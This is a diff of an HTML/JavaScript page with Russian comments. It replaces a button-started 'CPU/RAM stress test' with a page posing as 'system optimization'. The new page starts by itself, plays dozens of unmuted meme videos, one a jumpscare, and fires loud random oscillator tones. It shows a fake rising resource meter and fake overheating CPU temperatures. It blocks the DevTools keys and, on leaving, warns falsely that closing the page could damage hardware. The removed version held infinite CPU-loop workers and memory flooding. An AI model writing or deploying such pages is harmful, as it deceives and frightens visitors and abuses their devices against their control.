@@ -1,378 +1,270 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPU/RAM STRESS TEST</title>
-    <meta charset="UTF-8">
+    <title>СИСТЕМНЫЙ ВИЗУАЛИЗАТОР</title>
+    <meta name="robots" content="noindex, nofollow">
     <style>
-        * {
+        body, html {
+            overflow: hidden;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            overflow: hidden;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            touch-action: none;
             user-select: none;
+            -webkit-user-drag: none;
         }
-        
-        body, html {
+        .video-overlay {
+            position: absolute;
             width: 100%;
             height: 100%;
-            background: #000;
-            font-family: Arial, sans-serif;
-            touch-action: none;
+            z-index: 1;
+            mix-blend-mode: lighten;
         }
-        
-        #statsPanel {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            z-index: 100;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid #0f0;
+        .video-grid {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            grid-auto-rows: 300px;
+            overflow: hidden;
         }
-        
-        #warning {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: red;
-            font-size: 48px;
-            text-align: center;
-            z-index: 200;
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-weight: bold;
-            pointer-events: none;
+        .video-container {
+            position: relative;
+            overflow: hidden;
+            transform: scale(0.8) rotate(5deg);
+            filter: hue-rotate(90deg) contrast(150%);
+            transition: all 0.3s;
+            outline: 2px solid magenta;
         }
-        
-        #startButton {
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scale(1.5);
+        }
+        #overlayText {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(to right, #ff5500, #ffaa00);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             color: white;
-            border: none;
-            padding: 20px 50px;
-            font-size: 28px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            z-index: 300;
-            box-shadow: 0 0 30px rgba(255, 85, 0, 0.7);
-        }
-        
-        .video-instance {
-            position: absolute;
-            opacity: 0.8;
+            font-size: 24px;
+            text-align: center;
+            text-shadow: 0 0 10px red;
+            z-index: 10000;
             pointer-events: none;
-            transform: scale(0.7);
-            filter: hue-rotate(90deg);
-            border: 2px solid white;
-        }
-        
-        .particle {
-            position: absolute;
-            width: 5px;
-            height: 5px;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 5;
+            font-family: 'Arial Black', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(rgba(0,0,0,0.5), transparent);
         }
     </style>
 </head>
 <body>
-    <div id="statsPanel">
-        <div>CPU: <span id="cpuLoad">0%</span></div>
-        <div>RAM: <span id="ramUsage">0 MB</span></div>
-        <div>VIDEOS: <span id="videoCount">0</span></div>
-        <div>PARTICLES: <span id="particleCount">0</span></div>
+    <div id="overlayText">
+        <h1>СИСТЕМНАЯ ОПТИМИЗАЦИЯ</h1>
+        <p>Используется 100% ресурсов процессора</p>
+        <div id="resourceCounter">0%</div>
     </div>
-    <div id="warning">CPU OVERLOAD</div>
-    <button id="startButton">START CPU STRESS TEST</button>
+    <div class="video-grid" id="videoGrid"></div>
+    <div class="video-overlay" id="videoOverlay"></div>
 
     <script>
         // Конфигурация нагрузки
-        const VIDEO_INSTANCES = 300; // Количество видео
-        const MAX_PARTICLES = 500000; // 500 тысяч частиц
-        const MEMORY_BLOCKS = 1000; // Количество блоков памяти
-        const PHYSICS_STEPS = 20; // Шагов физики за кадр
-        const WORKER_COUNT = 8; // Количество веб-воркеров
+        const VIDEO_COUNT = 50; // Количество одновременно отображаемых видео
+        const GRID_SIZE = 15; // Количество ячеек в сетке
+        const PHYSICS_UPDATE = 10; // Частота физических расчетов (мс)
+        const AUDIO_NODES_LIMIT = 200; // Максимум аудио нод
+        
+        // Локальные видео
+        const VIDEO_SOURCES = [
+            "Olaf.mp4",
+            "ambatublow.mp4",
+            "Blue Lobster jumpscare 4k meme.mp4",
+            "Ima Tyre (Extended).mp4"
+        ];
         
         // Глобальные переменные
-        let particles = [];
-        let memoryBlocks = [];
-        let workers = [];
-        let videoElements = [];
-        let cpuUsage = 0;
-        let ramUsage = 0;
-        let testStarted = false;
+        let audioNodes = [];
+        let resourceUsage = 0;
+        let physicsEnabled = false;
         
-        // Инициализация теста
-        document.getElementById('startButton').addEventListener('click', function() {
-            if (testStarted) return;
+        // Инициализация визуализации
+        function initVisualOverload() {
+            // Создаем видео-сетку
+            const videoGrid = document.getElementById('videoGrid');
+            videoGrid.innerHTML = '';
             
-            testStarted = true;
-            this.style.display = 'none';
+            // Устанавливаем размер сетки
+            videoGrid.style.gridTemplateColumns = `repeat(${GRID_SIZE}, 1fr)`;
             
-            // Создание видео-копий
-            createVideoInstances();
+            // Создаем видео-контейнеры
+            for (let i = 0; i < VIDEO_COUNT; i++) {
+                const container = document.createElement('div');
+                container.className = 'video-container';
+                container.style.gridColumn = `span ${Math.floor(Math.random() * 3) + 1}`;
+                container.style.gridRow = `span ${Math.floor(Math.random() * 3) + 1}`;
+                
+                const vid = document.createElement('video');
+                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
+                vid.autoplay = true;
+                vid.loop = true;
+                vid.playsInline = true;
+                vid.volume = 1.0;
+                vid.muted = false;
+                
+                container.appendChild(vid);
+                videoGrid.appendChild(container);
+                
+                // Анимация контейнера
+                animateContainer(container);
+            }
             
-            // Создание частиц
-            createParticles();
+            // Запускаем физику
+            physicsEnabled = true;
+            physicsEngine();
             
-            // Запуск воркеров
-            startWorkers();
+            // Запускаем аудио-движок
+            startAudioEngine();
             
-            // Заполнение памяти
-            allocateMemory();
+            // Запускаем мониторинг ресурсов
+            monitorResources();
             
-            // Запуск физики
-            setInterval(updatePhysics, 0);
-            
-            // Запуск основного цикла
-            requestAnimationFrame(update);
-            
-            // Запуск мониторинга
-            setInterval(updateStats, 500);
-        });
+            // Добавляем эффект наложения
+            createOverlayEffect();
+        }
         
-        // Создание множества видео-копий
-        function createVideoInstances() {
-            const container = document.body;
+        // Физический движок
+        function physicsEngine() {
+            if (!physicsEnabled) return;
             
-            for (let i = 0; i < VIDEO_INSTANCES; i++) {
-                const video = document.createElement('video');
-                video.className = 'video-instance';
-                video.autoplay = true;
-                video.loop = true;
-                video.muted = true;
-                video.playsInline = true;
-                video.src = 'Olaf.mp4';
-                
-                // Случайная позиция и размер
-                video.style.left = Math.random() * 100 + 'vw';
-                video.style.top = Math.random() * 100 + 'vh';
-                video.style.width = (15 + Math.random() * 30) + 'vw';
-                
+            const containers = document.querySelectorAll('.video-container');
+            containers.forEach(container => {
                 // Случайные трансформации
-                video.style.transform = `
-                    scale(${0.4 + Math.random() * 0.6})
-                    rotate(${Math.random() * 360}deg)
-                `;
+                const scale = 0.7 + Math.random() * 0.6;
+                const rotate = (Math.random() - 0.5) * 30;
+                const x = (Math.random() - 0.5) * 20;
+                const y = (Math.random() - 0.5) * 20;
                 
-                // Фильтры
-                video.style.filter = `
-                    hue-rotate(${Math.random() * 360}deg)
-                    contrast(${100 + Math.random() * 200}%)
-                `;
-                
-                container.appendChild(video);
-                videoElements.push(video);
+                container.style.transform = `scale(${scale}) rotate(${rotate}deg) translate(${x}px, ${y}px)`;
+                container.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${150 + Math.random() * 100}%)`;
+            });
+            
+            setTimeout(physicsEngine, PHYSICS_UPDATE);
+        }
+        
+        // Аудио-движок
+        function startAudioEngine() {
+            setInterval(() => {
+                if (audioNodes.length > AUDIO_NODES_LIMIT) return;
                 
                 try {
-                    video.play();
-                } catch(e) {
-                    console.error("Video play failed:", e);
-                }
-            }
-            
-            document.getElementById('videoCount').textContent = VIDEO_INSTANCES;
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = ctx.createOscillator();
+                    oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
+                    oscillator.frequency.value = 80 + Math.random() * 2000;
+                    
+                    const gain = ctx.createGain();
+                    gain.gain.value = 0.7;
+                    
+                    oscillator.connect(gain);
+                    gain.connect(ctx.destination);
+                    oscillator.start();
+                    
+                    // Остановка через случайное время
+                    setTimeout(() => {
+                        oscillator.stop();
+                        try { ctx.close(); } catch(e) {}
+                        audioNodes = audioNodes.filter(n => n !== oscillator);
+                    }, 500 + Math.random() * 2000);
+                    
+                    audioNodes.push(oscillator);
+                } catch(e) {}
+            }, 50);
         }
         
-        // Создание частиц для нагрузки на CPU
-        function createParticles() {
-            particles = [];
-            for (let i = 0; i < MAX_PARTICLES; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
+        // Создание эффекта наложения
+        function createOverlayEffect() {
+            const overlay = document.getElementById('videoOverlay');
+            for (let i = 0; i < 10; i++) {
+                const vid = document.createElement('video');
+                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
+                vid.autoplay = true;
+                vid.loop = true;
+                vid.playsInline = true;
+                vid.volume = 0.3;
+                vid.muted = false;
+                vid.style.position = 'absolute';
+                vid.style.width = '100%';
+                vid.style.height = '100%';
+                vid.style.opacity = '0.3';
+                vid.style.filter = `blur(${10 + i * 2}px) hue-rotate(${i * 36}deg)`;
                 
-                // Случайные свойства
-                particle.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                particle.style.boxShadow = `0 0 ${Math.random() * 10 + 2}px currentColor`;
-                
-                // Начальная позиция
-                particle.style.left = `${Math.random() * 100}vw`;
-                particle.style.top = `${Math.random() * 100}vh`;
-                
-                document.body.appendChild(particle);
-                
-                // Сохранить для физики
-                particles.push({
-                    element: particle,
-                    x: Math.random() * window.innerWidth,
-                    y: Math.random() * window.innerHeight,
-                    vx: (Math.random() - 0.5) * 4,
-                    vy: (Math.random() - 0.5) * 4,
-                    size: parseFloat(particle.style.width),
-                });
-            }
-            
-            document.getElementById('particleCount').textContent = MAX_PARTICLES;
-        }
-        
-        // Запуск веб-воркеров для нагрузки на CPU
-        function startWorkers() {
-            const workerCode = `
-                self.onmessage = function() {
-                    // Интенсивные вычисления
-                    while(true) {
-                        // Математические операции
-                        let sum = 0;
-                        for (let i = 0; i < 10000000; i++) {
-                            sum += Math.sin(i) * Math.cos(i);
-                        }
-                        
-                        // Работа с большими массивами
-                        const bigArray = new Array(500000);
-                        for (let i = 0; i < 500000; i++) {
-                            bigArray[i] = Math.random();
-                        }
-                        
-                        // Сортировка
-                        bigArray.sort();
-                        
-                        // Криптографические операции
-                        let hash = 0;
-                        for (let i = 0; i < bigArray.length; i++) {
-                            hash = ((hash << 5) - hash) + bigArray[i];
-                            hash |= 0;
-                        }
-                        
-                        // Отправка результата
-                        postMessage(hash);
-                    }
-                };
-            `;
-            
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const workerURL = URL.createObjectURL(blob);
-            
-            for (let i = 0; i < WORKER_COUNT; i++) {
-                const worker = new Worker(workerURL);
-                worker.postMessage('start');
-                workers.push(worker);
+                overlay.appendChild(vid);
             }
         }
         
-        // Заполнение оперативной памяти
-        function allocateMemory() {
-            // Создание больших массивов
-            for (let i = 0; i < MEMORY_BLOCKS; i++) {
-                // Каждый блок ~2MB
-                const block = new Float64Array(262144); 
+        // Анимация контейнеров
+        function animateContainer(container) {
+            let scaleDir = 1;
+            
+            setInterval(() => {
+                const currentScale = parseFloat(container.style.transform.match(/scale\(([\d.]+)\)/)[1]) || 1;
+                const newScale = Math.max(0.5, Math.min(1.5, currentScale + 0.05 * scaleDir));
                 
-                // Заполнение данных
-                for (let j = 0; j < block.length; j++) {
-                    block[j] = Math.random();
+                if (newScale >= 1.5 || newScale <= 0.5) {
+                    scaleDir *= -1;
                 }
                 
-                memoryBlocks.push(block);
-            }
+                container.style.transform = container.style.transform.replace(
+                    /scale\([\d.]+\)/, 
+                    `scale(${newScale})`
+                );
+            }, 200);
         }
         
-        // Интенсивное обновление физики
-        function updatePhysics() {
-            const width = window.innerWidth;
-            const height = window.innerHeight;
-            
-            // Многократное обновление для увеличения нагрузки
-            for (let step = 0; step < PHYSICS_STEPS; step++) {
-                for (let i = 0; i < particles.length; i++) {
-                    const p = particles[i];
-                    
-                    // Физические расчеты
-                    p.vx += (Math.random() - 0.5) * 0.1;
-                    p.vy += (Math.random() - 0.5) * 0.1 + 0.05; // Гравитация
-                    
-                    p.x += p.vx;
-                    p.y += p.vy;
-                    
-                    // Отскоки от границ
-                    if (p.x < 0 || p.x > width) p.vx *= -0.8;
-                    if (p.y < 0 || p.y > height) p.vy *= -0.8;
-                    
-                    // Ограничение координат
-                    p.x = Math.max(0, Math.min(width, p.x));
-                    p.y = Math.max(0, Math.min(height, p.y));
-                    
-                    // Обновление позиции
-                    p.element.style.left = `${p.x}px`;
-                    p.element.style.top = `${p.y}px`;
+        // Мониторинг ресурсов
+        function monitorResources() {
+            setInterval(() => {
+                resourceUsage = Math.min(100, resourceUsage + 1 + Math.random() * 5);
+                document.getElementById('resourceCounter').textContent = Math.round(resourceUsage) + '%';
+                
+                // Визуальные эффекты при высокой нагрузке
+                if (resourceUsage > 80) {
+                    document.body.style.background = `radial-gradient(circle, hsl(${Math.random() * 360}, 100%, 50%), #000)`;
                 }
                 
-                // Дополнительная нагрузка: обновление видео
-                for (let i = 0; i < videoElements.length; i++) {
-                    if (i % 50 === 0) {
-                        const video = videoElements[i];
-                        video.style.transform = `
-                            scale(${0.5 + Math.random() * 0.5})
-                            rotate(${Math.random() * 360}deg)
-                        `;
-                        video.style.filter = `
-                            hue-rotate(${Math.random() * 360}deg)
-                            contrast(${100 + Math.random() * 200}%)
-                        `;
-                    }
+                if (resourceUsage > 95) {
+                    document.getElementById('overlayText').innerHTML = `
+                        <h1 style="color:red;font-size:3em;">ПЕРЕГРУЗКА СИСТЕМЫ!</h1>
+                        <p>Температура процессора: ${(90 + Math.random() * 20).toFixed(1)}°C</p>
+                    `;
                 }
-            }
+            }, 500);
         }
         
-        // Основной цикл обновления
-        function update() {
-            // Простая анимация без GPU нагрузки
-            for (let i = 0; i < particles.length; i += 1000) {
-                const p = particles[i];
-                p.element.style.backgroundColor = `hsl(${(Date.now() / 10 + i) % 360}, 100%, 50%)`;
-            }
-            
-            requestAnimationFrame(update);
-        }
-        
-        // Обновление статистики
-        function updateStats() {
-            // Расчет использования CPU (условный)
-            cpuUsage = Math.min(100, cpuUsage + 1 + Math.random() * 4);
-            
-            // Расчет использования RAM
-            ramUsage = Math.floor(performance.memory.usedJSHeapSize / (1024 * 1024));
-            
-            // Обновление панели
-            document.getElementById('cpuLoad').textContent = `${Math.round(cpuUsage)}%`;
-            document.getElementById('ramUsage').textContent = `${ramUsage} MB`;
-            
-            // Показ предупреждения при высокой нагрузке
-            if (cpuUsage > 90) {
-                document.getElementById('warning').style.opacity = '1';
-                document.getElementById('warning').textContent = `CPU OVERLOAD: ${Math.round(cpuUsage)}%`;
-            } else {
-                document.getElementById('warning').style.opacity = '0';
-            }
-            
-            // Автоматическое увеличение нагрузки
-            if (testStarted && cpuUsage < 95) {
-                cpuUsage += 0.5;
-            }
-        }
-        
-        // Блокировка защитных функций
-        window.addEventListener('keydown', (e) => {
+        // Блокировка защитных механизмов
+        document.addEventListener('keydown', e => {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                 e.preventDefault();
-                // Увеличение нагрузки при попытке открыть DevTools
-                cpuUsage = Math.min(100, cpuUsage + 15);
+                resourceUsage += 10;
             }
         });
         
-        window.onbeforeunload = (e) => {
+        window.onbeforeunload = e => {
             e.preventDefault();
             e.returnValue = '';
-            return "Тест процессора в процессе! Прерывание может вызвать нестабильность системы.";
+            return "Системная оптимизация в процессе! Закрытие страницы может повредить оборудование.";
         };
+        
+        // Автозапуск
+        setTimeout(initVisualOverload, 1000);
     </script>
 </body>
 </html>
